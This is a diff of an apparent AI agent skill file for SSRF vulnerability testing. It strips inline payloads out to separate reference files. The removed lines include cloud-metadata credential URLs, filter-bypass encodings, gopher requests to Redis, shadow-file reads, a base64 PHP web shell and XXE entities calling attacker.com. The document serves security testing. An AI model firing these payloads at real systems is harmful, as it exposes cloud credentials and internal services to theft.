@@ -1,7 +1,6 @@
 ---
 name: ssrf-testing
 description: Validate Server-Side Request Forgery (SSRF) vulnerabilities by testing if user-controlled URLs can reach internal services, cloud metadata endpoints, or alternative protocols. Use when testing CWE-918 (SSRF), CWE-441 (Unintended Proxy), CWE-611 (XXE leading to SSRF), or findings involving URL fetching, webhooks, file imports, image/PDF/SVG processing, or XML parsing with external entities.
-allowed-tools: Read, Write, Bash
 ---
 
 # SSRF Testing Skill
@@ -66,53 +65,29 @@ Enumerate internal services via response timing or error differences.
 ### 6. SSRF via XXE (CWE-611 → CWE-918)
 XML External Entity injection leading to SSRF.
 
-**Test Pattern:** Inject XXE payload with external entity pointing to internal URL
-```xml
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
-<foo>&xxe;</foo>
-```
+**Test Pattern:** Inject XXE payload with external entity pointing to internal URL  
 **Expected if secure:** XXE disabled or external entities blocked  
 **Actual if vulnerable:** Internal content returned in XML response
+
+See [examples.md](examples.md#xxe-based-ssrf) for payloads.
 
 ### 7. SSRF via PDF/HTML Rendering (CWE-918)
 HTML-to-PDF converters (wkhtmltopdf, Puppeteer, Chrome headless) fetch embedded resources.
 
-**Test Pattern:** Inject HTML with internal resource references
-```html
-<iframe src="http://169.254.169.254/latest/meta-data/">
-<img src="http://127.0.0.1:6379/">
-<link rel="stylesheet" href="http://internal-service/">
-<script src="http://169.254.169.254/"></script>
-```
-**CSS-based:**
-```css
-@import url('http://169.254.169.254/');
-background: url('http://127.0.0.1/');
-```
+**Test Pattern:** Inject HTML with internal resource references (iframe, img, link, script tags)  
+See [examples.md](examples.md#pdfhtml-renderer-ssrf) and [ssrf_payloads.py](references/ssrf_payloads.py) for payloads.
 
 ### 8. SSRF via SVG/Image Processing (CWE-918)
 Image processors that handle SVG or fetch external images.
 
-**Test Pattern:** Upload SVG with external references
-```xml
-<svg xmlns="http://www.w3.org/2000/svg">
-  <image href="http://169.254.169.254/latest/meta-data/" />
-  <use href="http://internal/file#id" />
-</svg>
-```
+**Test Pattern:** Upload SVG with external references  
+See [examples.md](examples.md#svgimage-processing-ssrf) for payloads.
 
 ### 9. Partial URL SSRF (Path Injection)
 Application constructs URL from user input (path/host injection).
 
-**Test Pattern:** Inject path traversal or host override
-```
-# Path injection
-/api/proxy?path=../../../internal/admin
-
-# Host injection via @ or CRLF
-/api/fetch?url=http://allowed.com@127.0.0.1/
-/api/fetch?url=http://allowed.com%0d%0aHost:%20127.0.0.1
-```
+**Test Pattern:** Inject path traversal or host override  
+See [examples.md](examples.md#advanced-bypass-examples) for techniques.
 
 ## Prerequisites
 - Target application running and reachable
@@ -136,326 +111,71 @@ Before testing, analyze vulnerability report and source code for:
 
 ### Phase 2: Establish Baseline
 
-Send a request to an external domain you control or an OOB service:
-
-```python
-# Baseline: external URL (should work if URL fetching enabled)
-baseline_url = "http://example.com/test"
-response = requests.post(f"{target}/api/fetch", json={"url": baseline_url})
-baseline_status = response.status_code
-```
+Send a request to an external domain you control or an OOB service to confirm URL fetching is enabled. See [validate_ssrf.py](references/validate_ssrf.py) for implementation.
 
 ### Phase 3: Test Internal Access
 
 #### Localhost Access
-```python
-payloads = [
-    "http://127.0.0.1",
-    "http://localhost",
-    "http://127.0.0.1:80",
-    "http://127.0.0.1:22",      # SSH
-    "http://127.0.0.1:3306",    # MySQL
-    "http://127.0.0.1:6379",    # Redis
-    "http://[::1]",             # IPv6 localhost
-    "http://0.0.0.0",
-]
 
-for payload in payloads:
-    response = requests.post(f"{target}/api/fetch", json={"url": payload})
-    if indicates_internal_access(response):
-        classification = "VALIDATED"
-        evidence = f"Localhost access via {payload}"
-```
+Test standard localhost references and bypass variants. See [ssrf_payloads.py](references/ssrf_payloads.py) `get_localhost_payloads()` for complete list including decimal/hex/octal encodings and [examples.md](examples.md#basic-ssrf---localhost-access) for testing patterns.
 
 #### Cloud Metadata Access
-```python
-cloud_payloads = {
-    "aws": "http://169.254.169.254/latest/meta-data/",
-    "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
-    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-    "digitalocean": "http://169.254.169.254/metadata/v1/",
-    "alibaba": "http://100.100.100.200/latest/meta-data/",
-    "oracle": "http://192.0.0.192/latest/meta-data/",
-}
 
-for provider, payload in cloud_payloads.items():
-    response = requests.post(f"{target}/api/fetch", json={"url": payload})
-    if contains_metadata(response):
-        classification = "VALIDATED"
-        evidence = f"Cloud metadata ({provider}) exposed: {payload}"
-```
+Test cloud provider metadata endpoints. See [ssrf_payloads.py](references/ssrf_payloads.py) `get_cloud_metadata_payloads()` for complete provider-specific URLs and required headers. See [examples.md](examples.md#cloud-metadata-ssrf) for testing patterns.
 
 ### Phase 4: Test Filter Bypasses
 
 #### IP Encoding Bypasses
-```python
-# All resolve to 127.0.0.1
-localhost_bypasses = [
-    "http://2130706433",           # Decimal
-    "http://0x7f000001",           # Hex
-    "http://0177.0.0.1",           # Octal
-    "http://127.1",                # Short form
-    "http://127.0.1",              # Short form
-    "http://0",                    # Zero
-    "http://[::ffff:127.0.0.1]",   # IPv6 mapped
-    "http://[0:0:0:0:0:ffff:127.0.0.1]",
-    "http://127.0.0.1.nip.io",     # DNS rebinding
-    "http://localtest.me",         # Resolves to 127.0.0.1
-]
 
-# All resolve to 169.254.169.254 (AWS metadata)
-metadata_bypasses = [
-    "http://2852039166",           # Decimal
-    "http://0xA9FEA9FE",           # Hex
-    "http://0251.0376.0251.0376",  # Octal
-    "http://[::ffff:169.254.169.254]",
-    "http://169.254.169.254.nip.io",
-]
-```
+Test decimal, hex, octal, IPv6-mapped encodings. See [ssrf_payloads.py](references/ssrf_payloads.py) `get_ip_encoding_payloads()` for encoding functions.
 
 #### URL Parser Confusion
-```python
-parser_bypasses = [
-    "http://attacker.com@127.0.0.1/",
-    "http://127.0.0.1#@attacker.com/",
-    "http://127.0.0.1\\@attacker.com/",
-    "http://attacker.com:80#@127.0.0.1/",
-    "http://127.1.1.1:80\\@127.2.2.2:80/",
-]
-```
+
+Exploit parser differences using @, #, \ characters. See [ssrf_payloads.py](references/ssrf_payloads.py) `get_url_parser_confusion_payloads()`.
 
 #### DNS Rebinding
-```python
-# Use 1u.ms service for DNS rebinding
-rebind_payloads = [
-    "http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms",
-    "http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms",
-]
-```
+
+Use DNS services that alternate responses (1u.ms, rebind.network). See [ssrf_payloads.py](references/ssrf_payloads.py) `get_dns_rebinding_payloads()`.
 
 #### Redirect-Based Bypass
-```python
-# Use redirect service to bypass validation
-redirect_payloads = [
-    "https://307.r3dir.me/--to/?url=http://127.0.0.1",
-    "https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/",
-]
-```
+
+Use 307/308 redirect services. See [ssrf_payloads.py](references/ssrf_payloads.py) `get_redirect_payloads()`.
 
 #### Unicode/Punycode Bypass
-```python
-# Unicode characters that normalize to ASCII
-unicode_bypasses = [
-    "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",           # Enclosed alphanumerics
-    "http://①②⑦.⓪.⓪.①",           # Circled numbers
-    "http://locⓐlhost",             # Mixed
-]
-```
+
+Test unicode normalization and punycode. See [ssrf_payloads.py](references/ssrf_payloads.py) for patterns.
 
 #### CRLF Injection in URL
-```python
-# Inject headers via CRLF in URL
-crlf_payloads = [
-    "http://allowed.com%0d%0aHost:%20127.0.0.1",
-    "http://allowed.com%0d%0a%0d%0aGET%20/internal",
-]
-```
+
+Inject headers via CRLF sequences. See [ssrf_payloads.py](references/ssrf_payloads.py) for patterns.
 
 #### JAR Scheme Bypass (Java)
-```python
-# Java JAR scheme - fully blind
-jar_payloads = [
-    "jar:http://127.0.0.1!/",
-    "jar:https://127.0.0.1!/",
-    "jar:ftp://127.0.0.1!/",
-]
-```
+
+Test JAR scheme for Java apps. See [ssrf_payloads.py](references/ssrf_payloads.py) `get_protocol_payloads()`.
 
 ### Phase 5: Test Protocol Handlers
 
-```python
-protocol_payloads = [
-    # File access
-    "file:///etc/passwd",
-    "file:///etc/shadow",
-    "file:///proc/self/environ",
-    "file:///c:/windows/win.ini",
-    "file://\\/\\/etc/passwd",
-    
-    # Gopher (internal service exploitation)
-    "gopher://127.0.0.1:6379/_INFO%0D%0A",                    # Redis INFO
-    "gopher://127.0.0.1:11211/_stats%0D%0A",                  # Memcached stats
-    "gopher://127.0.0.1:25/_HELO%20localhost%0D%0A",          # SMTP
-    "gopher://127.0.0.1:3306/_",                              # MySQL
-    
-    # Dict (port/service scanning)
-    "dict://127.0.0.1:6379/INFO",
-    "dict://127.0.0.1:11211/stats",
-    
-    # PHP wrappers (if PHP backend)
-    "php://filter/convert.base64-encode/resource=/etc/passwd",
-    "php://input",
-    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
-    "phar:///path/to/file.phar",
-    
-    # Java schemes
-    "netdoc:///etc/passwd",
-    "jar:http://127.0.0.1!/",
-    
-    # SFTP/FTP
-    "sftp://attacker.com:22/",
-    "ftp://attacker.com/",
-    "tftp://attacker.com:69/file",
-    
-    # LDAP
-    "ldap://127.0.0.1:389/",
-    "ldap://127.0.0.1:389/dc=example,dc=com",
-]
-
-for payload in protocol_payloads:
-    response = requests.post(f"{target}/api/fetch", json={"url": payload})
-    if response.status_code == 200 and has_file_content(response):
-        classification = "VALIDATED"
-        evidence = f"Protocol smuggling via {payload.split(':')[0]}://"
-```
+Test alternative URL schemes (file://, gopher://, dict://, php://, ldap://, etc.). See [ssrf_payloads.py](references/ssrf_payloads.py) `get_protocol_payloads()` and [examples.md](examples.md#protocol-smuggling) for complete list and patterns.
 
 ### Phase 5b: Test XXE-based SSRF
 
-If application processes XML, test XXE leading to SSRF:
-
-```python
-xxe_payloads = [
-    # Basic XXE to internal URL
-    '''<?xml version="1.0"?>
-    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
-    <data>&xxe;</data>''',
-    
-    # Blind XXE with OOB
-    '''<?xml version="1.0"?>
-    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
-    <data>test</data>''',
-    
-    # XXE to file://
-    '''<?xml version="1.0"?>
-    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-    <data>&xxe;</data>''',
-]
-```
+If application processes XML, test XXE leading to SSRF. See [ssrf_payloads.py](references/ssrf_payloads.py) `get_xxe_payloads()` for examples.
 
 ### Phase 5c: Test HTML/PDF Injection SSRF
 
-If application generates PDFs from HTML (wkhtmltopdf, Puppeteer):
-
-```python
-html_ssrf_payloads = [
-    '<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600">',
-    '<img src="http://127.0.0.1:6379/">',
-    '<link rel="stylesheet" href="http://169.254.169.254/">',
-    '<script src="http://127.0.0.1/"></script>',
-    '<object data="http://169.254.169.254/">',
-    '<embed src="http://127.0.0.1/">',
-    '<style>@import url("http://169.254.169.254/");</style>',
-    '<div style="background: url(\'http://169.254.169.254/\');">',
-]
-```
+If application generates PDFs from HTML, inject tags that fetch resources. See [ssrf_payloads.py](references/ssrf_payloads.py) `get_html_injection_payloads()`.
 
 ### Phase 6: Blind SSRF Detection
 
-```python
-# Use OOB callback service
-oob_domain = "YOUR_ID.oastify.com"  # Burp Collaborator
-# or "YOUR_ID.interact.sh"
-
-blind_payloads = [
-    f"http://{oob_domain}/ssrf-test",
-    f"http://127.0.0.1.{oob_domain}/",
-]
-
-for payload in blind_payloads:
-    requests.post(f"{target}/api/fetch", json={"url": payload})
-
-# Check OOB service for callbacks
-# If HTTP/DNS callback received → VALIDATED (Blind SSRF)
-```
+Use OOB callback service (Burp Collaborator, interact.sh) to detect blind SSRF. See [examples.md](examples.md#blind-ssrf) and [validate_ssrf.py](references/validate_ssrf.py) for implementation.
 
 ### Phase 7: Classification Logic
 
-```python
-def classify_ssrf(response, payload_type, baseline):
-    # Check for internal content indicators
-    internal_indicators = [
-        # Linux files
-        "root:x:0:0",               # /etc/passwd
-        "daemon:x:1:1",             # /etc/passwd
-        "/bin/bash",                # /etc/passwd
-        
-        # Windows files
-        "[boot loader]",            # win.ini
-        "[extensions]",             # win.ini
-        
-        # AWS metadata
-        "ami-id",
-        "instance-id", 
-        "AccessKeyId",
-        "SecretAccessKey",
-        "iam/security-credentials",
-        "meta-data",
-        
-        # GCP metadata
-        "computeMetadata",
-        "service-accounts",
-        "project-id",
-        
-        # Azure metadata
-        "subscriptionId",
-        "resourceGroupName",
-        "vmId",
-        
-        # Services
-        "redis_version",            # Redis
-        "STAT items",               # Memcached
-        "mongodb",                  # MongoDB
-        "Server: nginx",            # Internal nginx
-        "Server: Apache",           # Internal Apache
-        
-        # Docker/K8s
-        "container_id",
-        "kubernetes",
-        "docker",
-        
-        # Process/environment
-        "PATH=",                    # /proc/self/environ
-        "HOME=",                    # /proc/self/environ
-        "AWS_",                     # AWS env vars
-    ]
-    
-    if response.status_code == 200:
-        content = response.text.lower()
-        
-        # Check for internal content
-        if any(ind.lower() in content for ind in internal_indicators):
-            return "VALIDATED", "Internal/cloud content exposed"
-        
-        # Check for different response than baseline (potential internal access)
-        if response.text != baseline.text and len(response.text) > 0:
-            return "PARTIAL", "Different response for internal URL (manual review needed)"
-    
-    # Check for timing differences (port scanning)
-    if payload_type == "port_scan":
-        if response_time > baseline_time + 2.0:
-            return "PARTIAL", f"Timing anomaly ({response_time:.2f}s) suggests port filtering"
-    
-    # OOB callback received (checked separately)
-    if oob_callback_received:
-        return "VALIDATED", "Blind SSRF confirmed via OOB callback"
-    
-    # Blocked or error
-    if response.status_code in [400, 403, 500]:
-        return "FALSE_POSITIVE", "Request blocked or rejected"
-    
-    return "UNVALIDATED", "Inconclusive result"
-```
+Classify responses based on internal content indicators, timing differences, and OOB callbacks. See [validate_ssrf.py](references/validate_ssrf.py) for complete classification function with indicators for:
+- Linux/Windows system files
+- AWS/GCP/Azure metadata
+- Internal services (Redis, Memcached, etc.)
+- Docker/K8s environments
 
 **Status Definitions:**
 
@@ -468,26 +188,7 @@ def classify_ssrf(response, payload_type, baseline):
 
 ## Evidence Capture
 
-```json
-{
-  "status": "VALIDATED",
-  "ssrf_type": "cloud_metadata",
-  "baseline": {
-    "url": "http://example.com/test",
-    "status": 200,
-    "response_snippet": "<!DOCTYPE html>..."
-  },
-  "test": {
-    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    "status": 200,
-    "response_snippet": "{\"Code\": \"Success\", \"AccessKeyId\": \"[REDACTED]\", \"SecretAccessKey\": \"[REDACTED]\"}",
-    "response_hash": "sha256:abc123...",
-    "truncated": false
-  },
-  "bypass_used": "none",
-  "evidence": "AWS IAM credentials exposed via SSRF to metadata endpoint"
-}
-```
+Capture baseline, test payload, response data, and classification. See [examples.md](examples.md#test-result-types) for evidence structure.
 
 **CRITICAL Redaction Requirements:**
 - AWS AccessKeyId, SecretAccessKey, Token
@@ -587,8 +288,8 @@ For comprehensive examples with payloads and evidence, see `examples.md`:
 
 ## Reference Implementations
 
-See `reference/` directory for implementation examples:
-- **`ssrf_payloads.py`**: Payload generators for all bypass techniques
+See `references/` directory for implementation examples:
+- **`ssrf_payloads.py`**: Payload generator functions for all bypass techniques
 - **`validate_ssrf.py`**: Complete SSRF testing script with classification
 - **`README.md`**: Usage guidance and adaptation notes
 
